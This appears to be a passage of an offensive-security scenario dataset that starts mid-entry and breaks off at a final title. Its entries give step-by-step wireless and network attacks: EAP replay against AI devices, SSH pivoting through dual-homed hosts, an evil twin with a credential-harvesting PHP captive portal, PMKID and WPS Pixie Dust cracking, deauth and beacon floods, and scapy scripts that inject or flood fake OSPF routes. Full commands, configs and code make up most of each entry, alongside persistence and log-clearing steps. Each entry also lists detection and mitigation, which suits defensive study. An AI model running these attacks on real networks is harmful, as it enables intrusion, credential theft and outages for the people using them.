http.proxy on
✅ You now fully hijack traffic from victim---### 🟢 STEP 6: Dataset Creation (for ML/Detection)1. Record .pcap of port stealing traffic2. Log spoofed MACs, ARP flood rate3. Label:• layer2_hijack
• arp_spoof
• switch_port_steal
Use for NDR and anomaly-based detection models---### 🛑 STEP 7: Cleanup• Restore real MAC:sudo macchanger -p eth0• Stop arpspoof / ettercap• Restart network interfaces on both ends• Inform blue team (if red team activity)🧠 Tips:• Works best on unmanaged or dumb switches• For advanced setups, combine with DHCP starvation + rogue DHCP for full control• Chain with responder for NTLM relay post-hijack

Title: Rogue Supplicant Emulation (EAP Replay / Emulation)
Attack Type: Wireless Replay & Emulation Attack on AI Agents
Scenario Description: Attackers emulate legitimate 802.1X supplicants or replay EAP packets over wireless networks (e.g., WPA2-Enterprise) to hijack or impersonate AI devices that auto-connect to Wi-Fi networks, compromising agent communication or triggering misclassified behavior.
Tools Used: Wireshark, Aircrack-ng, EAPHammer, hcxdumptool, hcxpcapngtool, Kali Linux
Attack Steps: Step 1: Set up a wireless interface in monitor mode using tools like airmon-ng start wlan0. Ensure your system is compatible with monitor mode (e.g., via Kali Linux or a supported USB Wi-Fi adapter). Step 2: Use hcxdumptool to scan and capture all 802.1X EAP authentication packets being exchanged between client devices (AI agents, laptops, etc.) and the RADIUS server (via APs). This can be done using the command hcxdumptool -i wlan0mon -o eap.pcapng --enable_status=15. Let it run for a few minutes to collect multiple handshakes and EAP messages. Step 3: Convert the captured .pcapng file into a standard .pcap file for analysis using hcxpcapngtool. This allows you to inspect packets in Wireshark or replay them later. Step 4: Open the .pcap file in Wireshark and locate EAP-Response Identity and EAP-Request Identity frames. This will give you the MAC address, SSID, and supplicant identity (e.g., "ai-agent-001@company.com"). Step 5: Set up EAPHammer to launch a rogue Access Point that mimics the real one (same SSID). Use eaphammer --interface wlan0 --essid CorpNet --creds --wpa2 --channel 6. This will broadcast a fake enterprise network. Step 6: Replay or inject captured EAP-Identity requests or responses using tools like eapol_test or custom scapy scripts to impersonate the legitimate AI device. You can craft replayed EAP responses to confuse the backend or RADIUS server. Step 7: If the backend is poorly configured (e.g., accepts repeated EAP-Responses or does not validate replay protection), it may mistakenly accept the rogue device or log in the attacker. Step 8: If the AI agent is configured to auto-join trusted SSIDs without verifying server certs (common in embedded ML edge devices), it may connect to the rogue AP. You now have a man-in-the-middle position. Step 9: Use a packet sniffer to capture and inspect any outbound traffic from the AI agent, such as model updates, inference requests, or telemetry. Step 10: Optionally, spoof inference queries or manipulate responses to influence ML model behavior (e.g., model drift, poisoned input). Step 11: Clean up and disconnect rogue AP after capturing desired data. Analyze captured results. This attack can fully compromise AI agent behavior or expose ML telemetry.
Vulnerability: Weak EAP handling, no replay protection
Impact: Credential capture, AI agent hijack, data tampering
Detection Method: Monitor wireless logs for duplicate identities, sudden rogue APs, or unexpected MAC addresses
Solution: Enforce mutual TLS and proper 802.1X certificate validation on AI devices; configure replay protection; disable auto-connect to trusted SSIDs

Title: Bridge Connection via Authenticated Host (Dual NIC Pivoting)
Attack Type: Internal Network Pivoting via AI Host
Scenario Description: Attacker abuses an AI server with two network interfaces (e.g., public + private subnet) to pivot from a public network into an internal ML infrastructure.
Attack Steps: Step 1: Attacker identifies an AI/ML host (e.g., inference server or notebook interface like Jupyter) that is internet-facing and reachable on port 22 (SSH), 443, or 8888. Step 2: Through open-source intelligence or scanning, attacker finds that the host is dual-homed (has two NICs): one on a public network and another on a private subnet where internal ML APIs or GPU servers live. Step 3: Attacker authenticates to the public-facing host—either via stolen credentials, weak passwords (like admin:admin), or social engineering/phishing to gain SSH or web login. Step 4: After gaining shell access or a terminal on the public-facing AI host, attacker confirms network interfaces using ip addr, ifconfig, or netstat -rn. They discover two networks (e.g., eth0 on 10.x.x.x and eth1 on 192.168.x.x). Step 5: Attacker now attempts to reach internal IPs using ping or nmap -sP 192.168.1.0/24. If live hosts are found, attacker knows the AI host can reach internal devices not exposed publicly. Step 6: Using nmap, attacker scans internal IPs like 192.168.1.10 for open ports used by model-serving frameworks (TensorFlow Serving, TorchServe), databases (MySQL, MongoDB), and ML APIs. Step 7: Once an internal service is found (e.g., MLFlow UI at 192.168.1.23:5000), attacker sets up SSH local port forwarding using: ssh -L 5000:192.168.1.23:5000 user@ai-host. Now the local port 5000 maps to the internal ML service. Step 8: Attacker opens http://localhost:5000 on their browser and accesses the internal service as if it were local. This can include sensitive dashboards, experiment logs, or model endpoints. Step 9: Alternatively, attacker sets up SOCKS proxy using: ssh -D 9050 user@ai-host, then configures browser or tools (like proxychains) to route through the proxy and scan/exploit internal services. Step 10: Attacker can now laterally move to other systems, exploit vulnerable ML stacks (e.g., insecure API endpoints, RCE in model upload features), or exfiltrate datasets/models. Step 11: For persistence, attacker may drop SSH keys in ~/.ssh/authorized_keys, create new users, or install cronjobs/backdoors on the AI host. Step 12: This pivoting works because dual-NIC hosts are rarely monitored as routers, yet they silently bridge public and internal networks when misconfigured or left unmanaged.
MITRE Technique: T1570 – Lateral Movement via Network Tunneling
Impact: Full access to internal ML infra, dataset theft, model exfiltration
Detection Method: Monitor for port forwarding and SSH tunnel patterns; log internal traffic from public IP origins
Solution: Block SSH forwarding/tunneling; isolate AI hosts via VLANs; enforce firewalls between interfaces; monitor dual-NIC routing activity
Tags: ML Inference Server, Pivoting, Dual NIC Exploit

Title: WEP Cracking (Legacy Encryption)
Scenario Description: This simulation demonstrates the cracking of WEP (Wired Equivalent Privacy), a deprecated and insecure Wi-Fi encryption protocol. WEP relies on RC4 stream cipher with weak Initialization Vectors (IVs). These IVs repeat frequently and are sent in plaintext. Attackers capture a large number of IVs and then use statistical attacks to recover the encryption key. Once cracked, the attacker can decrypt Wi-Fi traffic or fully connect to the network. Despite being obsolete, WEP is still seen in older routers, legacy IoT devices, or unmaintained corporate setups.

Title: Evil Twin Attack (Fake AP + Captive Portal)
Scenario Description: This simulation demonstrates a classic Evil Twin Attack, where the attacker sets up a rogue access point (AP) that mimics a legitimate Wi-Fi network. When users connect to the fake AP, they are served a captive portal (login page clone) prompting for credentials (e.g., corporate, school, or email credentials). Victims are tricked into submitting credentials which are captured and logged by the attacker. This attack is effective in airports, cafés, universities, and offices where users expect a captive portal. The attack works even on WPA2-PSK networks if deauthentication is used to kick victims off the real AP, and many reconnect automatically to the stronger rogue signal.
Tools Used: ✅ Kali Linux or Parrot OS✅ Wi-Fi adapter with AP mode (e.g., Alfa AWUS036NHA)✅ hostapd or airgeddon (for AP setup)✅ dnsmasq or lighttpd / apache2✅ iptables, php, sslstrip✅ Captive portal template (HTML/PHP login page)✅ Optional: Bettercap, Wireshark, EvilAP, Wifiphisher
Attack Steps:
### 🟢 STEP 1: Lab Preparation• Use Kali Linux as the attacker machine• Use an external USB Wi-Fi adapter that supports AP mode• Ensure no network manager interference:sudo systemctl stop NetworkManagersudo rfkill unblock all---### 🟢 STEP 2: Identify Target Wi-Fi Network• Scan with sudo airodump-ng wlan0mon• Find the target SSID (e.g., "CorpNet")• Note BSSID, channel, encryption---### 🟢 STEP 3: Deauthenticate Real Users (Optional)• Force clients to disconnect from real AP:sudo aireplay-ng -0 5 -a <BSSID> wlan0mon✅ Users will attempt to reconnect — many auto-connect to strongest signal---### 🟢 STEP 4: Set Up Fake AP (Evil Twin)Using airgeddon or manually:• Install tools:sudo apt install hostapd dnsmasq apache2• Create hostapd.conf:ini
interface=wlan0
driver=nl80211
ssid=CorpNet
hw_mode=g
channel=6
auth_algs=1
ignore_broadcast_ssid=0
• Start AP:sudo hostapd hostapd.conf✅ Fake AP is now broadcasting "CorpNet" on same channel---### 🟢 STEP 5: Configure DHCP and DNS• Create dnsmasq.conf:ini
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
dhcp-authoritative
address=/#/10.0.0.1
• Start DHCP:sudo dnsmasq -C dnsmasq.conf✅ All DNS queries are redirected to local web server---### 🟢 STEP 6: Set Up Captive Portal• Create a fake login page using HTML/PHP• Save as /var/www/html/index.phpExample fake form:html
<form method="POST" action="login.php">
<input name="username">
<input name="password" type="password">
<input type="submit">
</form>
Create login.php to capture and log credentials:php
file_put_contents('creds.txt', $_POST['username'] . ':' . $_POST['password'] . "\n", FILE_APPEND);
✅ Web server now logs all submitted credentials---### 🟢 STEP 7: Enable IP Forwarding and Firewall Redirectssudo sysctl -w net.ipv4.ip_forward=1sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADEOptional: Use iptables to redirect HTTP/HTTPS to local captive portal---### 🟢 STEP 8: Victim Connects• Victim connects to "CorpNet"• Any URL they open redirects to captive portal• Victim enters username/password✅ Credentials logged in creds.txt---### 🟢 STEP 9: Optional Enhancements• Use Bettercap for real-time credential logging• SSLstrip to downgrade HTTPS• Serve fake VPN, email, or SSO login screens---### 🛑 STEP 10: Cleanup• Stop services:sudo pkill hostapd dnsmasq apache2• Clear logs: rm creds.txt• Restart networking:sudo systemctl restart NetworkManager🧠 Tip: Works well in public Wi-Fi spaces with captive portal expectations
Target Type: Public Wi-Fi Users<brCorporate Environments<brSchools and Cafés
Vulnerability: - No SSID verification- No certificate pinning- Auto-connect to known networks- Users trust captive portals- Poor client awareness
MITRE Technique: T1557.002 – Man-in-the-MiddleT1110 – Brute Force (Credential Harvesting via Fake Login)T1185 – Browser Session Hijacking
Impact: - Theft of enterprise or personal credentials- Unauthorized network access- Session hijacking- Internal compromise- Phishing for VPN/email/SSO
Detection Method: - Use WIDS to detect rogue APs broadcasting same SSID- Alert on duplicate SSID with different MAC- Monitor captive portal traffic and DNS hijacking- Browser warnings on invalid certs
Solution: - Train users to verify captive portal domains- Enforce VPN before login- Use WPA2-Enterprise with cert validation- Block MACs of fake APs- Disable auto-connect to open or known networks
Source: HackTricks, Airgeddon Wiki, Bettercap Docs, OWASP Wireless Attack Guide

Title: PMKID Attack (No Client Needed)
Scenario Description: The PMKID attack targets WPA2-PSK networks that use 802.11r (fast roaming) or certain misconfigurations. Unlike traditional handshake cracking, this method does not require any connected clients or deauthentication attacks. Instead, the attacker passively requests a PMKID (Pairwise Master Key Identifier) directly from the Access Point (AP). If successful, the PMKID can be captured and then brute-forced offline to recover the Wi-Fi password. This method is stealthy, fast, and extremely useful in environments with no active clients. Most consumer routers are vulnerable unless patched or WPA3-only.
Tools Used: ✅ Kali Linux (or Parrot OS)✅ USB Wi-Fi Adapter with monitor mode (e.g., Alfa AWUS036ACH)✅ hcxdumptool (for PMKID capture)✅ hcxpcapngtool (to convert capture file)✅ hashcat (for offline cracking)✅ Wordlist (e.g., rockyou.txt, custom dictionary)✅ Optional: airodump-ng for initial recon
Attack Steps:
### 🟢 STEP 1: Install Required ToolsInstall hcxdumptool and hashcat if not already installed:bash
sudo apt update && sudo apt install hcxtools hcxdumptool hashcat
---### 🟢 STEP 2: Enable Monitor ModeList interfaces:iwconfig → look for wlan0Enable monitor mode:sudo ip link set wlan0 downsudo iw dev wlan0 set type monitorsudo ip link set wlan0 up✅ Or use:sudo airmon-ng start wlan0 → wlan0mon---### 🟢 STEP 3: Identify Nearby Wi-Fi Targets (Optional)sudo airodump-ng wlan0mon✅ Note SSID, BSSID (MAC), and Channel of WPA2 targets---### 🟢 STEP 4: Capture PMKID (Clientless Method)Run:sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1Let it run for 1–3 minutes✅ Tool will send crafted requests and listen for PMKID responses from APsLook for lines like:WPA*01*... → indicates PMKID capturedStop with Ctrl+C once at least one PMKID is captured---### 🟢 STEP 5: Extract Hash from Capture FileConvert .pcapng file to hashcat format:hcxpcapngtool -o pmkid_hash.txt pmkid.pcapngOpen pmkid_hash.txt and confirm line starts with WPA*01*...---### 🟢 STEP 6: Crack PMKID with HashcatRun hashcat:bash
hashcat -m 16800 -a 0 pmkid_hash.txt /usr/share/wordlists/rockyou.txt --force
• -m 16800 → mode for WPA-PMKID• -a 0 → dictionary attack✅ Wait for successful crack:[Recovered]... password123🧠 Cracking time depends on password strength & wordlist---### 🟢 STEP 7: Connect to Wi-Fi (Post-Crack)Use recovered password to join Wi-Fi via GUI or:nmcli dev wifi connect 'SSID' password 'password123'✅ Full access to LAN/internet---### 🛑 STEP 8: Cleanup• Stop monitor mode:sudo airmon-ng stop wlan0mon• Delete captured files if needed:rm pmkid*• Restart networking:sudo systemctl restart NetworkManager🧠 Note: This attack does not require victims to be online — works in passive environments
Target Type: Home Wi-Fi Routers<brPublic Hotspots<brCorporate WPA2-PSK Networks
Vulnerability: - Misconfigured WPA2 routers- PMKID leak in RSN handshake- No rate-limiting for PMKID requests- Weak Wi-Fi passwords
MITRE Technique: T1040 – Network Traffic CaptureT1110.001 – Brute Force (Dictionary Attack)T1557 – Man-in-the-Middle
Impact: - Wi-Fi password theft- Full access to target network- Device or service compromise- LAN snooping, scanning, attacks- Potential lateral movement
Detection Method: - Monitor for unusual management frame activity- Alert on repeated PMKID requests- Use WIDS/WIPS to detect passive frame scanning- Correlate failed auth attempts post-attack
Solution: - Patch routers to latest firmware- Use WPA3 or WPA2-Enterprise- Enforce long, complex PSKs- Block untrusted MACs- Rotate Wi-Fi keys frequently
Source: Hashcat Docs, Hcxdumptool Wiki, HackTricks, PacketStorm Security, Offensive Security Notes

Title: WPS PIN Brute Force (Pixie Dust Attack)
Attack Type: WPS Offline PIN Brute Force (Local & Fast)
Scenario Description: This simulation demonstrates how attackers exploit a weakness in Wi-Fi Protected Setup (WPS) to recover a WPA/WPA2 PSK without needing the handshake or client deauthentication. WPS is designed to simplify wireless setup using an 8-digit PIN, but many routers implement it insecurely. The Pixie Dust Attack exploits a vulnerability in the random number generation used during the key exchange in some WPS implementations. If successful, the attack can recover the WPS PIN and derive the Wi-Fi password in seconds to minutes — without any brute force or wordlist. This attack requires no connected clients and is particularly dangerous for legacy routers or cheap IoT access points.
Tools Used: ✅ Kali Linux or Parrot OS✅ External USB Wi-Fi adapter supporting monitor & injection mode (e.g., Alfa AWUS036NHA)✅ reaver (WPS PIN attack tool)✅ pixiewps (offline attack against weak RNGs)✅ wash (WPS scan tool)✅ Optional: airmon-ng, airodump-ng, Wireshark
Attack Steps:
### 🟢 STEP 1: Environment Preparation• Boot into Kali Linux• Plug in external Wi-Fi adapter (must support monitor mode and injection)✅ Check interface: iwconfig → should show wlan0---### 🟢 STEP 2: Enable Monitor Modesudo airmon-ng start wlan0✅ Creates wlan0mon---### 🟢 STEP 3: Scan for WPS-Enabled APsUse wash to scan:sudo wash -i wlan0monLook for:• WPS Version• Locked = No• Signal = Strong (above -70 dBm)✅ Note BSSID, Channel, and SSID of target---### 🟢 STEP 4: Launch Pixie Dust Attack with ReaverStart attack:sudo reaver -i wlan0mon -b -c -vvv -K 1 -fExplanation:• -K 1 = enables Pixie Dust attack• -f = ignores checksum errors✅ Reaver initiates a WPS handshake, captures public keys, and calls pixiewpsIf vulnerable:
[+] Pixie Dust attack complete.
[+] WPS PIN: 12345670
[+] WPA PSK: qwerty12345
[+] AP SSID: Home_WiFi
🧠 This works only if router has bad RNG for WPS---### 🟢 STEP 5: Connect to the Wi-Fi NetworkUse the recovered WPA PSK:nmcli dev wifi connect 'Home_WiFi' password 'qwerty12345'✅ Full access to target network---### 🛑 STEP 6: Cleanup• Stop monitor mode:sudo airmon-ng stop wlan0mon• Restart networking:sudo systemctl restart NetworkManager• Clear any WPS logs:rm reaver*🧠 Tips:• Not all routers are vulnerable to Pixie Dust• Use close range to improve success rate• Attack is stealthy compared to deauth methods
Target Type: Consumer Wi-Fi Routers<brIoT Hubs<brLegacy WPS-Enabled Access Points
Vulnerability: - Weak RNG for Diffie-Hellman keys- Enabled WPS PIN authentication- Static PIN generation- Poor WPS timeout handling
MITRE Technique: T1557 – Man-in-the-MiddleT1110.004 – Credential Cracking (Offline via PIN RNG flaws)T1040 – Network Traffic Capture
Impact: - Immediate disclosure of WPA2 password- Full wireless access- Potential LAN compromise- Zero interaction needed from victim
Detection Method: - Monitor logs for WPS brute force attempts- IDS/IPS alerts for Reaver-like behavior- Alert if WPS is still enabled on access points
Solution: - Disable WPS permanently (recommended)- Update router firmware (patch Pixie Dust vulns)- Enforce WPA2/3 with strong PSK- Monitor for suspicious probe/auth activity
Source: Reaver Docs, Pixiewps GitHub, HackTricks, Kali Linux Tutorials, PacketStorm Security

Title: Deauthentication Attack (DoS)
Scenario Description: This simulation demonstrates a Deauthentication Attack, a simple but powerful layer 2 denial-of-service technique targeting Wi-Fi networks. Attackers flood the air with spoofed deauthentication frames, which forcibly disconnect clients from their Access Points (APs). Since 802.11 deauth frames are unencrypted and unauthenticated, anyone can spoof them — no credentials or association needed. This attack causes temporary or persistent Wi-Fi outages, disrupts connectivity, or can be used as a prelude to Evil Twin or Man-in-the-Middle (MITM) attacks. It works on open, WPA2, and even WPA3 networks. Effective in corporate, public, or educational environments where availability is critical.
Tools Used: ✅ Kali Linux or Parrot OS✅ External USB Wi-Fi adapter supporting monitor + injection (e.g., Alfa AWUS036ACH)✅ airmon-ng (enable monitor mode)✅ aireplay-ng (send deauth frames)✅ airodump-ng (scan targets)✅ Optional: mdk4, Wireshark, Bettercap
Attack Steps: ### 🟢 STEP 1: Environment Setup• Boot Kali Linux• Plug in compatible Wi-Fi adapter✅ Check adapter: iwconfig → should show wlan0---### 🟢 STEP 2: Enable Monitor Modesudo airmon-ng start wlan0✅ Creates interface: wlan0mon---### 🟢 STEP 3: Scan for Wi-Fi TargetsUse airodump-ng:sudo airodump-ng wlan0monIdentify:• BSSID of Access Point• Channel (CH)• Connected clients (STATION field)✅ Choose target AP and client---### 🟢 STEP 4: Deauthentication Attack (Targeted Client)Run:sudo aireplay-ng --deauth 10 -a <AP-BSSID> -c <CLIENT-MAC> wlan0mon• Sends 10 deauth packets to single client---### 🟢 STEP 5: Deauthentication Attack (All Clients on AP)sudo aireplay-ng --deauth 1000 -a <AP-BSSID> wlan0mon✅ All clients disconnected repeatedly---### 🟢 STEP 6: Continuous Deauth FloodUse mdk4 for non-stop attack:sudo mdk4 wlan0mon d -b blacklist.txt -c <channel>Create blacklist.txt with:<BSSID> (one per line)✅ This causes total wireless outage for target AP---### 🟢 STEP 7: Optional Sniffing or MITMDuring attack:• Victims may connect to rogue AP• Use tools like Bettercap or Wireshark for session hijacking or phishing---### 🛑 STEP 8: Cleanup• Stop monitor mode:sudo airmon-ng stop wlan0mon• Restart networking:sudo systemctl restart NetworkManager• Delete logs or captures🧠 Tips:• Legal only in lab environments• Can trigger IDS/IPS• Best used before Evil Twin or PMKID attack
Vulnerability: - Unauthenticated 802.11 management frames- Lack of WPA3 Protected Management Frames (PMF)- No WIDS/WIPS in place
MITRE Technique: T1498.001 – Network Denial of Service: Wireless DoST1557.002 – Man-in-the-Middle (via forced disconnect)
Impact: - Temporary or persistent network outage- Disruption of services and productivity- Client frustration- Enables further MITM or Evil Twin attacks
Detection Method: - WIDS/WIPS alerts for repeated deauth frames- Wireshark capture shows high volume of 802.11 deauths- Alert on excessive disconnect/reconnects
Solution: - Enable WPA3 or WPA2 PMF (Protected Management Frames)- Use WIDS/WIPS like Cisco WLC, Aruba, or Ubiquiti Defense- Monitor for unusual disconnect spikes- Disable open Wi-Fi wherever possible
Source: HackTricks, Aircrack-ng Docs, MITRE ATT&CK, Offensive Security PWK

Title: Beacon Flood (Fake AP Overload)
Scenario Description: This simulation showcases the Beacon Flood Attack, where an attacker sends out a flood of fake SSID beacon frames, each broadcasting a unique, bogus network name. These beacons mimic Access Points (APs), tricking nearby devices into overloading their Wi-Fi lists, potentially causing freezes, UI lag, or crashes. Beacon flooding also confuses users by listing fake networks like “Free_Public_WiFi” or “Corporate_WiFi_2”. This does not require any connected clients and can be used as social engineering bait or to sabotage wireless surveys, rogue AP detection tools, or wireless onboarding. It's frequently used in wireless red teaming or denial-of-service demonstrations.
Tools Used: ✅ Kali Linux / Parrot OS✅ External USB Wi-Fi adapter with monitor + injection support (e.g., Alfa AWUS036ACH)✅ mdk4 (beacon flooding tool)✅ Optional: aircrack-ng, airodump-ng, Wireshark for validation✅ Custom SSID list (text file of fake network names)
Attack Steps:
### 🟢 STEP 1: Lab Setup• Boot Kali Linux• Plug in external USB Wi-Fi adapter✅ Confirm interface: iwconfig (look for wlan0)---### 🟢 STEP 2: Enable Monitor ModeRun:sudo airmon-ng start wlan0✅ Creates monitor interface: wlan0mon---### 🟢 STEP 3: Create Fake SSID ListCreate fake_aps.txt:
Free_Public_WiFi
Corporate_Guest
Police_WiFi
Hotel_5G_Auth
Campus_Wireless
Starbucks_WiFi
VirusHotspot
FakeXfinity
OfficeBackup_AP
HiddenProbe_AP
✅ You can add 100+ entries---### 🟢 STEP 4: Launch Beacon FloodRun:sudo mdk4 wlan0mon b -f fake_aps.txt -s 100Explanation:• b → beacon flood mode• -f → path to fake SSID list• -s → delay (in ms) between beacons✅ Nearby devices now detect dozens or hundreds of fake APs---### 🟢 STEP 5: Observe Impact• Open Wi-Fi list on target devices:→ Sluggish UI→ Fake SSIDs appear→ Some devices may freeze or auto-connect (if known SSIDs used)• Run airodump-ng wlan0mon on another terminal:→ See spoofed BSSIDs (random MACs), same/different channels🧠 Can be used as bait for Evil Twin, phishing, or redirect---### 🟢 STEP 6: Advanced Usage (Dynamic SSID Generation)Use:sudo mdk4 wlan0mon b -s 50→ Random SSIDs auto-generated in real time✅ Flood never ends and no list file required---### 🛑 STEP 7: Cleanup• Stop beacon flood:Ctrl+C• Stop monitor mode:sudo airmon-ng stop wlan0mon• Restart networking:sudo systemctl restart NetworkManager🧠 Note:• Attack does not require handshake, client, or credentials• Fully passive targets still affected• Very hard to filter by signature without WIDS
Target Type: Public Wi-Fi Clients<brPhones/Tablets<brRouters with weak AP detection<brSurvey Tools
Vulnerability: - Lack of frame validation- No SSID spoofing protection- Beacon frame unauthenticated- OSes not rate-limiting SSID display list
MITRE Technique: T1498.001 – Network Denial of Service: Wireless DoST1557.002 – Adversary-in-the-Middle (as prelude to MITM)
Impact: - DoS via Wi-Fi UI overload- Confusion from fake SSIDs- Failed onboarding of real APs- Potential social engineering lure- Device crashes in rare cases
Detection Method: - Analyze 802.11 beacon frame volume via Wireshark- Look for numerous SSIDs on same BSSID prefix or channel- Enable WIDS alerting on high beacon rate- UI logs show freeze or slow SSID population
Solution: - Enable WIDS/WIPS (e.g., Aruba, Cisco, Ubiquiti)- Suppress display of unknown/open SSIDs- Filter out spoofed BSSIDs in detection tools- Disable auto-connect to open SSIDs- Use SSID whitelisting policies
Source: HackTricks, mdk4 Docs, Aircrack-ng Wiki, IEEE 802.11 Frame Standards

Title: OSPF Route Injection (Fake LSA)
Scenario Description: This simulation demonstrates how an attacker can exploit Open Shortest Path First (OSPF) routing protocol to inject fake Link-State Advertisements (LSAs) into a target network. If OSPF authentication is misconfigured (null or weak), a rogue device can form an adjacency and advertise malicious routes (e.g., to a fake gateway or blackhole), misleading routers into rerouting traffic. This attack can be used to achieve Man-in-the-Middle (MITM), traffic blackholing, or network segmentation bypass in corporate or ISP networks. It is dangerous in flat or missegmented OSPF areas and especially if area 0 is exposed.
Tools Used: ✅ GNS3 or EVE-NG (for lab)✅ Kali Linux or Ubuntu (attacker)✅ scapy (for custom LSA injection)✅ ospf6d / quagga or frrouting (to emulate OSPF router)✅ Target router/switch supporting OSPF (Cisco, Juniper, etc.)✅ Wireshark (to analyze OSPF traffic)✅ Virtual network with OSPF neighbors
Attack Steps:
### 🟢 STEP 1: Setup a Virtual OSPF LabUse GNS3 or EVE-NG to simulate:• 2 legitimate OSPF routers (R1, R2)• 1 attacker machine (Kali Linux)✅ Connect them via Ethernet switch in same broadcast domainEnsure OSPF is enabled and routers are exchanging LSAs normally---### 🟢 STEP 2: Observe OSPF TrafficOn attacker machine:sudo wiresharkFilter: ospf✅ Confirm Type 1 (Router LSA) and Type 2 (Network LSA) exchangesNote: Router IDs and area IDs---### 🟢 STEP 3: Disable OSPF Authentication (if needed)✅ Ensure no MD5/password is configured on OSPF interfacesOn Cisco:no ip ospf authentication🧠 This makes the network vulnerable to rogue LSA injection---### 🟢 STEP 4: Craft a Fake LSA Using ScapyInstall required modules:sudo pip install scapyThen create script fake_lsa.py:python
from scapy.all import *
from scapy.contrib.ospf import *

lsa = OSPF_LSA_Hdr(ls_age=1, ls_type=1, link_state_id="10.0.0.0", adv_router="1.1.1.1")
pkt = IP(dst="224.0.0.5")/OSPF_Hdr(router="2.2.2.2")/OSPF_DBDesc()/lsa
send(pkt, iface="eth0")
✅ This advertises a fake route to 10.0.0.0/24 via malicious router 2.2.2.2---### 🟢 STEP 5: Send the Fake LSA to the NetworkRun the script:sudo python3 fake_lsa.pyUse Wireshark to verify:• LSA was received by other routers• New route installed on routing table---### 🟢 STEP 6: Observe Impact• Routers update routing table• Packets for 10.0.0.0/24 now go to attacker's interface✅ You’ve successfully hijacked a route🧠 You can now:• MITM traffic• Blackhole packets• Redirect to malicious web server---### 🛑 STEP 7: Cleanup• Stop script• Restart routers• Re-enable OSPF authentication:ip ospf authentication message-digestip ospf message-digest-key 1 md5 🧠 Tip: OSPFv2 uses plaintext by default unless configuredOSPFv3 (IPv6) supports stronger security but still spoofable without AH/IPSec
Target Type: Corporate Routers<brCampus Backbone<brISP Core<brCloud IaaS Platforms
Vulnerability: - Lack of OSPF authentication- Flat OSPF area (0) exposure- Accepting unverified LSAs- No route origin validation
MITRE Technique: T1557.002 – Adversary-in-the-MiddleT1565.001 – Network Traffic ManipulationT1040 – Network Sniffing
Impact: - Full path redirection- MITM via rogue gateway- Route blackholing / segmentation bypass- Loss of availability / traffic hijack
Detection Method: - Monitor OSPF LSA logs for unknown router IDs- Alert on unexpected routing changes- Use OSPF authentication logs- Deploy NetFlow or Wireshark for route monitoring
Solution: - Enforce OSPF MD5 or SHA authentication- Isolate OSPF areas with strict ACLs- Use BFD for neighbor validation- Monitor for OSPF anomalies in NMS/IDS- Use Passive Interfaces when not routing
Source: Cisco Security Whitepapers, HackTricks, GNS3 Labs, MITRE ATT&CK, FRRouting Docs

Title: OSPF Spoofed Router ID / LSA Flood
Attack Type: Routing Protocol DoS / Routing Table Pollution
Scenario Description: This simulation explains how an attacker can perform a denial-of-service or routing disruption in an OSPF network by spoofing multiple router IDs and flooding the network with fake Link-State Advertisements (LSAs). The goal is to overwhelm the LSDB (Link-State Database) and cause routing instability, CPU spikes, or even router crashes. Since OSPF does not authenticate LSAs by default, an attacker can send falsified LSAs with made-up router IDs, tricking routers into updating their tables with bogus entries. This attack is especially damaging in flat OSPF areas (e.g., area 0) with no route filtering or MD5 authentication. It is commonly used to disrupt routing behavior or cover traffic redirection attacks.
Tools Used: ✅ Kali Linux or Ubuntu (attacker)✅ GNS3 or EVE-NG (lab routers)✅ Python + Scapy + scapy.contrib.ospf✅ Wireshark (to verify LSA injections)✅ quagga or frrouting (optional for emulated routers)✅ iptables to block route recovery after flood
Attack Steps:
### 🟢 STEP 1: Lab Environment SetupUse GNS3 or EVE-NG to simulate:• Two legitimate routers (R1 and R2)• One attacker host (Kali Linux)Connect all to a common Ethernet segment so they participate in the same OSPF area---### 🟢 STEP 2: Enable OSPF on R1 and R2Ensure both routers exchange OSPF LSAsOn Cisco:router ospf 1network 192.168.1.0 0.0.0.255 area 0Verify routes with:show ip ospf database---### 🟢 STEP 3: Confirm No OSPF AuthenticationOn both routers:show ip ospf interface✅ Ensure "Authentication: None"🧠 If authentication is enabled, disable it for this test---### 🟢 STEP 4: Install Python RequirementsOn attacker machine:sudo pip install scapycd /usr/lib/python3/dist-packages/scapy/contrib && sudo wget https://raw.githubusercontent.com/secdev/scapy/master/scapy/contrib/ospf.py✅ Enables OSPF packet crafting---### 🟢 STEP 5: Craft Spoofed LSA Flood ScriptCreate lsa_flood.py:python
from scapy.all import *
from scapy.contrib.ospf import *

for i in range(1, 101):
fake_id = f"10.0.{i}.1"
lsa = OSPF_LSA_Hdr(ls_type=1, link_state_id=fake_id, adv_router=fake_id, ls_seqnum=0x80000001)
ospf_pkt = IP(dst="224.0.0.5")/OSPF_Hdr(router=fake_id, area="0.0.0.0")/OSPF_DBDesc()/lsa
send(ospf_pkt, iface="eth0")
This sends 100 fake Router LSAs with different Router IDs---### 🟢 STEP 6: Execute Floodsudo python3 lsa_flood.py✅ Target routers will process each LSA and update their LSDBCheck with:show ip ospf database router🧠 You’ll see entries from fake router IDs like 10.0.1.1, 10.0.2.1, etc.---### 🟢 STEP 7: Observe Impact• CPU usage on R1/R2 spikes• Routing table flaps or becomes unstable• Potential crash or reboot• Real routes may be overridden or dropped---### 🛑 STEP 8: Cleanup• Reboot routers or clear LSDB manuallyclear ip ospf process• Re-enable OSPF MD5 authenticationip ospf authentication message-digest🧠 Optionally block attacker using ACL:ip access-list standard BLOCK_ATTACKERdeny host permit anyinterface Xip access-group BLOCK_ATTACKER in
Vulnerability: - No LSA authentication- Flat OSPF topology (no area segmentation)- LSAs accepted without verification
MITRE Technique: T1498 – Network Denial of ServiceT1557.002 – Adversary-in-the-Middle via RoutingT1565.001 – Network Traffic Manipulation
Impact: - Routing table instability- CPU exhaustion on routers- Traffic rerouting or blackholing- Full OSPF process failure or router crash
Detection Method: - Monitor OSPF LSA logs for excessive unique router IDs- Use Wireshark to see fake LSA source IPs- Check routing logs for flaps or route changes
Solution: - Enforce OSPF authentication (MD5, SHA)- Use passive interfaces on edge connections- Limit LSAs via route filters- Isolate OSPF areas with strict ACLs- Monitor LSDB size and router CPU periodically
Source: HackTricks, Cisco Docs, GNS3 Labs, Scapy OSPF GitHub, MITRE ATT&CK

Title: OSPF Authentication Bypass
